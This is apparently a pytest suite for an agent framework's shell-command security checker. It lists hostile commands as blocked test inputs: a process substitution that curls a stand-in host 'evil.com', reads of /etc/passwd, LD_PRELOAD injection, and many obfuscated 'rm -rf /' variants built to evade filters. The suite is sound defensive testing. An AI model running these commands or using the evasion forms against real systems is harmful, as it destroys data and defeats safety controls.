"""Tests for shell command security validation module."""

import subprocess
import sys
from unittest.mock import patch

import pytest
from agentloom.execution.tool_governance.shell.security import (
    _check_destructive_patterns,
    _destructive_rm_description,
    _extract_unquoted_content,
    _has_unescaped_backtick,
    check_command_security,
    validate_command_security,
)

# =========================================================================
# Helper
# =========================================================================

def _mock_config_all_enabled(*args, default=None):
    """Mock config that enables all security checks (default behavior)."""
    return None


def _mock_config_all_disabled(*args, default=None):
    """Mock config that returns all checks disabled."""
    if args == ("shell_settings", "security_checks"):
        return {
            "command_substitution": False,
            "process_substitution": False,
            "env_injection": False,
            "ifs_injection": False,
            "control_characters": False,
            "incomplete_commands": False,
            "dangerous_shell_prefix": False,
            "zsh_dangerous_commands": False,
            "parameter_expansion": False,
            "destructive_patterns": False,
        }
    return default


# =========================================================================
# Normal path — safe commands pass all checks
# =========================================================================

class TestSafeCommands:
    """Verify that normal, safe commands pass all security checks."""

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "echo hello world",
        "git status",
        "cat README.md",
        "python -m pytest",
        "make build",
        "npm run test",
        "grep -r 'pattern' src/",
        "find . -name '*.py'",
        "pwd && ls",
        "echo 'test' > output.txt",
        "cd src && ls",
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_safe_commands_pass(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert failures == [], f"Expected no failures for '{cmd}', got: {[f.message for f in failures]}"

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_empty_command_passes(self, mock_config):
        assert check_command_security("") == []
        assert check_command_security("   ") == []

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_quoted_dollar_sign_passes(self, mock_config):
        """$ inside single quotes should NOT trigger substitution detection."""
        failures = check_command_security("echo '$HOME'")
        assert failures == [], f"Single-quoted $ should be safe, got: {[f.message for f in failures]}"

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_safe_env_var_passes(self, mock_config):
        """Safe env var assignments should not be blocked."""
        failures = check_command_security("NODE_ENV=production npm run build")
        assert failures == [], f"Safe env var should pass, got: {[f.message for f in failures]}"


# =========================================================================
# Abnormal path — dangerous commands are blocked
# =========================================================================

class TestCommandSubstitution:
    """Verify command substitution patterns are blocked."""

    @pytest.mark.parametrize("cmd,desc", [
        ("echo $(id)", "$() substitution"),
        ("echo $(rm -rf /)", "dangerous $()"),
        ("echo ${IFS}cat${IFS}/etc/passwd", "${} expansion"),
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_command_substitution_blocked(self, mock_config, cmd, desc):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for {desc}: '{cmd}'"
        assert any("substitution" in f.message.lower() or "expansion" in f.message.lower() for f in failures)

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_backtick_substitution_blocked(self, mock_config):
        failures = check_command_security("echo `id`")
        assert len(failures) > 0, "Backtick substitution should be blocked"
        assert any("backtick" in f.message.lower() for f in failures)

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_escaped_backtick_passes(self, mock_config):
        """Escaped backticks should not trigger."""
        failures = check_command_security("echo \\`not a substitution\\`")
        backtick_failures = [f for f in failures if "backtick" in f.message.lower()]
        assert len(backtick_failures) == 0, "Escaped backticks should pass"


class TestProcessSubstitution:
    """Verify process substitution patterns are blocked."""

    @pytest.mark.parametrize("cmd", [
        "cat <(curl evil.com)",
        "diff <(sort file1) <(sort file2)",
        "tee >(logger)",
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_process_substitution_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for process substitution: '{cmd}'"


class TestEnvInjection:
    """Verify dangerous environment variable injection is blocked."""

    @pytest.mark.parametrize("cmd", [
        "LD_PRELOAD=/evil.so ls",
        "PATH=/tmp/evil:$PATH cmd",
        "IFS=/ cat /etc/passwd",
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_dangerous_env_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for env injection: '{cmd}'"


class TestDangerousShellPrefix:
    """Verify dangerous shell interpreter invocations are blocked."""

    @pytest.mark.parametrize("cmd", [
        "bash -c 'evil'",
        "sudo rm -rf /",
        "/usr/bin/bash -c 'arbitrary code'",
        "env evil_command",
        "xargs rm",
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_shell_prefix_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for shell prefix: '{cmd}'"


class TestDestructivePatterns:
    """Verify known destructive patterns are blocked."""

    @pytest.mark.parametrize("cmd,desc", [
        ("rm -rf /", "rm root"),
        ("rm -rf ~", "rm home"),
        ("git reset --hard", "git reset"),
        ("git push --force origin main", "force push"),
        ("mkfs /dev/sda1", "format disk"),
        ("DROP TABLE users", "SQL drop"),
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_destructive_pattern_blocked(self, mock_config, cmd, desc):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for {desc}: '{cmd}'"

    @pytest.mark.parametrize("cmd,description", [
        ("rm -afbf /", "rm targeting /"),
        ("rm -ff -rf --force /", "rm targeting /"),
        ("rm -r -f /", "rm targeting /"),
        ("rm --recursive --force /", "rm targeting /"),
        ("rm -rf -- /", "rm targeting /"),
        ("rm -r -f ~", "rm targeting home"),
        ("rm ~/rm", "rm targeting home"),
        ("rm ~user/rm", "rm targeting home"),
        ("command rm ~/rm", "rm targeting home"),
        ("rm {~,x}/rm", "rm targeting home"),
        ("rm ordinary.txt /", "rm targeting /"),
        ("rm ordinary.txt; rm -r -f /", "rm targeting /"),
        ("rm /;", "rm targeting /"),
        ("rm -rf 'x;y' /", "rm targeting /"),
        ('rm -rf "x;y" "/"', "rm targeting /"),
        ("command /bin/rm -rf /", "rm targeting /"),
        ("command -p /bin/rm -rf /", "rm targeting /"),
        ("exec rm -rf /", "rm targeting /"),
        ("time rm -rf /", "rm targeting /"),
        ("! rm -rf /", "rm targeting /"),
        ("{ rm -rf /; }", "rm targeting /"),
        ("if true; then rm -rf /; fi", "rm targeting /"),
        ("true; >/tmp/out rm -rf /", "rm targeting /"),
        ("true; env rm -rf /", "rm targeting /"),
        ("command env rm -rf /", "rm targeting /"),
        ("command rm -rf \"$IGNORED\" /", "rm targeting /"),
        ("exec rm -rf \"$IGNORED\" /", "rm targeting /"),
        ("time rm -rf \"$IGNORED\" /", "rm targeting /"),
        ("exec -ca fake rm -rf /", "rm targeting /"),
        ("repeat 1 rm -rf /", "rm targeting /"),
        ("noglob rm -rf /", "rm targeting /"),
        ("nocorrect rm -rf /", "rm targeting /"),
        ("noglob - rm -rf /", "rm targeting /"),
        ("nocorrect - rm -rf /", "rm targeting /"),
        ("repeat 1 noglob rm -rf /", "rm targeting /"),
        ("repeat 1 rm -rf / *(.om[1])", "shell syntax could not be verified"),
        ("command env FOO=$x rm -rf /", "rm targeting /"),
        ("command env -S 'rm -rf /'", "rm targeting /"),
        ("env env -S 'rm -rf /'", "rm targeting /"),
        ("command env env -S 'rm -rf /'", "rm targeting /"),
        ("/usr/bin/env /usr/bin/env -S 'sh -c \"rm -rf ~\"'", "rm targeting home"),
        ("env -S'rm -rf /'", "rm targeting /"),
        ("env -iS 'rm -rf /'", "rm targeting /"),
        ("env -P /bin -S 'rm -rf /'", "rm targeting /"),
        ("command env -P /bin -S 'rm -rf /'", "rm targeting /"),
        (r"env -S 'rm\_-rf\_/'", "rm targeting /"),
        ("env --split-string='rm -rf /'", "rm targeting /"),
        ("command env -S 'bash -c' 'rm -rf /'", "rm targeting /"),
        ("command env -S 'bash -c --' '--bad; rm -rf /'", "rm targeting /"),
        ("command env -S 'bash -c --' '+bad; rm -rf /'", "rm targeting /"),
        ("command nice rm -rf /", "rm targeting /"),
        ("true; sudo rm -rf /", "rm targeting /"),
        ("true; timeout 1 rm -rf /", "rm targeting /"),
        ("true; xargs rm -rf /", "rm targeting /"),
        ("true; sh -c 'rm -rf /'", "rm targeting /"),
        ("command bash -O nullglob -c 'rm -rf /'", "rm targeting /"),
        ("command bash -o posix -c 'rm -rf /'", "rm targeting /"),
        ("command zsh -o SH_WORD_SPLIT -c 'rm -rf /'", "rm targeting /"),
        ("command bash -xo posix -c 'rm -rf /'", "rm targeting /"),
        ("command bash -xO nullglob -c 'rm -rf /'", "rm targeting /"),
        ("command bash -oc posix 'rm -rf /'", "rm targeting /"),
        ("command bash -co posix 'rm -rf /'", "rm targeting /"),
        ("command bash -c -o posix 'rm -rf /'", "rm targeting /"),
        ("command bash -c -O nullglob 'rm -rf /'", "rm targeting /"),
        ("command bash -c +o posix 'rm -rf /'", "rm targeting /"),
        ("command bash -c +O nullglob 'rm -rf /'", "rm targeting /"),
        ("command bash --rcfile sh -oc posix 'rm -rf /'", "rm targeting /"),
        ("command zsh -ocorrect -c 'rm -rf /'", "rm targeting /"),
        ("bash -c -- '--bad; rm -rf /'", "rm targeting /"),
        ('env -S "bash -c -- \'--bad; rm -rf /\'"', "rm targeting /"),
        ("find . -exec rm -rf / \\;", "rm targeting /"),
        ("command env -u PATH -S 'rm -rf /'", "rm targeting /"),
        ("command env --unset PATH -S 'rm -rf /'", "rm targeting /"),
        ("command env -C /tmp -S 'rm -rf /'", "rm targeting /"),
        ("command env -iu SHELL -S 'rm -rf /'", "rm targeting /"),
        ("command env -iuSHELL -S 'rm -rf /'", "rm targeting /"),
        ("command env -uSHELL -S 'rm -rf /'", "rm targeting /"),
        ("$'rm' -rf /", "rm targeting /"),
        ('$"rm" -rf /', "shell syntax could not be verified"),
        ('bash -c \'rm $"safe"\'', "shell syntax could not be verified"),
        ("$'\\x72\\x6d' -rf /", "rm targeting /"),
        ("$'\\u0072\\u006d' -rf /", "rm targeting /"),
        (r"r$'\0'm -rf /", "rm targeting /"),
        (r"r$'\0x'm -rf /", "rm targeting /"),
        (r"r$'\x00'm -rf /", "rm targeting /"),
        (r"r$'\x00x'm -rf /", "rm targeting /"),
        (r"r$'\u0000'm -rf /", None),
        (r"r$'\U00000000'm -rf /", None),
        (r"r$'\c@'m -rf /", "rm targeting /"),
        ("rm -rf $'/'", "rm targeting /"),
        ("rm -rf $'\\x2f'", "rm targeting /"),
        ("rm -rf $'\\u002f'", "rm targeting /"),
        (r"rm -rf $'/\0'", "rm targeting /"),
        (r"rm -rf $'/\x00tmp'", "rm targeting /"),
        ('""{rm,-rf} /', "rm targeting /"),
        ('""{rm,-rf,/}', "rm targeting /"),
        ("r{m..m} -rf /", "rm targeting /"),
        ("rm -rf /{tmp/..,}", "rm targeting /"),
        ("rm -rf /{0..0}/..", "rm targeting /"),
        ("rm -rf {/,/tmp}", "rm targeting /"),
        ("rm /tmp/..", "rm targeting /"),
        ("rm /tmp", None),
        ("rm ordinary.txt; echo ~", None),
        ("rm ordinary.txt && echo ~", None),
        ("rm ordinary.txt\necho /", None),
        ("rm -rf '~'", None),
        (r"rm -rf \~", None),
        ('rm "\\/"', None),
        ("echo rm -rf /", "rm targeting /"),
        ("echo 'rm -rf /'", None),
        ("xrm -rf /", None),
        ("command -v rm /", None),
        ("command -V rm /", None),
        ("rm -rf /tmp/{a,b}", None),
        ("rm -rf '/{tmp/..,}'", None),
        ("rm -rf /{tmp'/..,'}", None),
        ('rm -rf ""{~,x}', None),
        ("env -S 'rm ~'", None),
        ("env -S 'rm {/,x}'", None),
        ("sh -c 'printf safe'", None),
        ("bash --norc -c 'printf safe'", None),
        ("bash -c 'printf safe' argv0 'rm -rf /'", None),
        ("env -S 'bash -c' 'printf safe' argv0 '('", None),
        ("bash --rcfile -c 'rm -rf /'", None),
        ("bash --init-file -oc posix 'rm -rf /'", None),
        ("cat <<EOF\nrm -rf /\nEOF", None),
    ])
    def test_rm_target_detection_handles_equivalent_flag_forms(self, cmd, description):
        result = _check_destructive_patterns(cmd, cmd)
        assert _destructive_rm_description(cmd) == description
        assert (result is not None) is (description is not None)

    def test_repeated_force_flags_are_checked_without_backtracking(self):
        script = """
from agentloom.execution.tool_governance.shell.security import _check_destructive_patterns

repeated_flags = "-ff " * 10_000
assert _check_destructive_patterns(f"rm {repeated_flags}/tmp", "") is None
result = _check_destructive_patterns(f"rm {repeated_flags}~user/path", "")
assert result is not None
assert result.check_id == "destructive_patterns"
"""
        subprocess.run(
            [sys.executable, "-c", script],
            check=True,
            capture_output=True,
            text=True,
            timeout=3,
        )

    def test_nested_command_wrappers_are_checked_in_linear_time(self):
        script = """
from agentloom.execution.tool_governance.shell.security import _destructive_rm_description
from agentloom.execution.tool_governance.shell.shell_command_ast import analyze_shell_command

wrappers = "command " * 20_000
assert _destructive_rm_description(f"{wrappers}rm /") == "rm targeting /"
deeply_nested = "(" * 1_000 + "echo safe" + ")" * 1_000
assert _destructive_rm_description(deeply_nested) == "shell syntax could not be verified"
assert _destructive_rm_description(("sh " * 20_000) + "printf safe") is None
assert _destructive_rm_description(("env " * 20_000) + "printf safe") is None
assert _destructive_rm_description("echo " + ("rm " * 20_000) + "safe") is None
assert _destructive_rm_description(
    "printf " + " ".join(["-/env"] * 20_000)
) is None
assert _destructive_rm_description(
    "env " + ("-u env " * 20_000) + "printf safe"
) is None
assert _destructive_rm_description("rm /tmp/" + ("{" * 20_000)) is None
nested_env = "env " + " ".join(["-Senv"] * 50) + " -S'rm -rf /'"
assert _destructive_rm_description(nested_env) == "shell syntax could not be verified"
huge_number = "9" * 5_000
assert _destructive_rm_description(
    f"rm /{{{huge_number}..{huge_number}}}/.."
) == "rm shell word expansion could not be verified"
assert _destructive_rm_description(
    f"rm /{{a..z..{huge_number}}}/.."
) == "rm shell word expansion could not be verified"
nested = "printf safe"
for _ in range(300):
    nested = f'echo {"x" * 100} "$({nested})"'
analysis = analyze_shell_command(nested, static_commands_only=True)
retained = sum(len(command.name) + sum(map(len, command.args)) + len(command.source) for command in analysis.commands)
assert retained < len(nested) * 2
assert _destructive_rm_description(nested) is None
"""
        subprocess.run(
            [sys.executable, "-c", script],
            check=True,
            capture_output=True,
            text=True,
            timeout=3,
        )


class TestControlCharacters:
    """Verify control characters are blocked."""

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_null_byte_blocked(self, mock_config):
        failures = check_command_security("echo \x00hidden")
        assert len(failures) > 0, "Null byte should be blocked"

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_bel_char_blocked(self, mock_config):
        failures = check_command_security("echo \x07bell")
        assert len(failures) > 0, "BEL character should be blocked"


class TestIncompleteCommands:
    """Verify incomplete command fragments are blocked."""

    @pytest.mark.parametrize("cmd", [
        "\techo injected",
        "-rf /",
        "&& echo gotcha",
        "|| rm -rf /",
        "; cat /etc/passwd",
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_fragments_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for fragment: '{cmd!r}'"


class TestZshDangerousCommands:
    """Verify Zsh-specific dangerous commands are blocked."""

    @pytest.mark.parametrize("cmd", [
        "zmodload zsh/system",
        "sysopen /etc/passwd",
        "ztcp evil.com 80",
        "zf_rm /etc/passwd",
    ])
    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_zsh_commands_blocked(self, mock_config, cmd):
        failures = check_command_security(cmd)
        assert len(failures) > 0, f"Expected block for zsh command: '{cmd}'"


# =========================================================================
# Boundary / edge cases
# =========================================================================

class TestBoundaryConditions:
    """Edge cases and boundary conditions."""

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_validate_raises_on_failure(self, mock_config):
        """validate_command_security should raise ValueError."""
        with pytest.raises(ValueError, match="Blocked"):
            validate_command_security("echo $(id)")

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_validate_passes_safe_command(self, mock_config):
        """validate_command_security should not raise for safe commands."""
        validate_command_security("ls -la")  # should not raise

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_disabled)
    def test_all_checks_disabled_passes_everything(self, mock_config):
        """When all checks are disabled, even dangerous commands pass."""
        failures = check_command_security("echo $(rm -rf /)")
        assert failures == [], "All disabled checks should let everything through"

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested")
    def test_single_check_toggle(self, mock_get):
        """Disabling one check should not affect others."""
        mock_get.return_value = {"command_substitution": False}
        # $() should now pass, but destructive should still be caught
        failures = check_command_security("rm -rf /")
        assert any(f.check_id == "destructive_patterns" for f in failures)

    @patch("agentloom.execution.tool_governance.shell.security.C.get_nested", side_effect=_mock_config_all_enabled)
    def test_multiple_failures_reported(self, mock_config):
        """A command hitting multiple checks should report all failures."""
        # This hits both env_injection (LD_PRELOAD) and dangerous_shell_prefix (sudo)
        failures = check_command_security("sudo rm -rf /")
        assert len(failures) >= 1, "Should catch at least one issue"


class TestQuoteExtraction:
    """Test the internal quote extraction helper."""

    def test_single_quotes_stripped(self):
        result = _extract_unquoted_content("echo '$HOME' world")
        assert "$HOME" not in result
        assert "world" in result

    def test_double_quotes_stripped(self):
        result = _extract_unquoted_content('echo "$HOME" world')
        assert "$HOME" not in result
        assert "world" in result

    def test_mixed_quotes(self):
        result = _extract_unquoted_content("""echo '$HOME' "$PATH" rest""")
        assert "$HOME" not in result
        assert "$PATH" not in result
        assert "rest" in result

    def test_escaped_quote(self):
        result = _extract_unquoted_content("echo \\'not quoted")
        assert "not" in result

    def test_backtick_detection(self):
        assert _has_unescaped_backtick("echo `id`") is True
        assert _has_unescaped_backtick("echo \\`safe\\`") is False
        assert _has_unescaped_backtick("echo hello") is False
